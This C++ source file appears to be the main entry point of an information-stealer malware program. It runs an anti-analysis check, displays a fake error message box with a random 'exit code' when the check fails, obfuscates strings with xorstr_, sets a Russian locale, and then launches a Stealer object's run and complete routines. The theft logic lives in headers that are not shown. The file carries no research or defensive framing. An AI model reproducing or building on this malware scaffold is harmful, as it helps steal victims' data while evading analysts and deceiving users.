#include "stealer/Stealer.h"
#include <locale>
#include "windows.h"
#include "utils/Utils.h"

#if !DEV
#include "antianalysis/AntiAnalysisChecker.h"
#endif

void globalExceptionHandler() {
    try {
        throw;
    } catch (const std::exception& e) {
#ifdef DEV
        std::cerr << "Exception caught in globalExceptionHandler: " << e.what() << std::endl;
#endif
    } catch (...) {
#ifdef DEV
        std::cerr << "Unknown exception caught in globalExceptionHandler." << std::endl;
#endif
    }
}

int main() {
    std::set_terminate(globalExceptionHandler);

#ifndef DEV
    if(!AntiAnalysisChecker::check())
    {
        std::string str = "Exit code: 0x" + Utils::generateString(5, "01");
        MessageBox(nullptr,
                   str.c_str(),
                   nullptr,
                   MB_RETRYCANCEL | MB_ICONERROR);
    }
#endif

    std::locale::global(std::locale(""));
    setlocale(LC_ALL, xorstr_("ru-RU"));

    Stealer stealer;
    stealer.run();
    stealer.complete();

    return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    return main();
}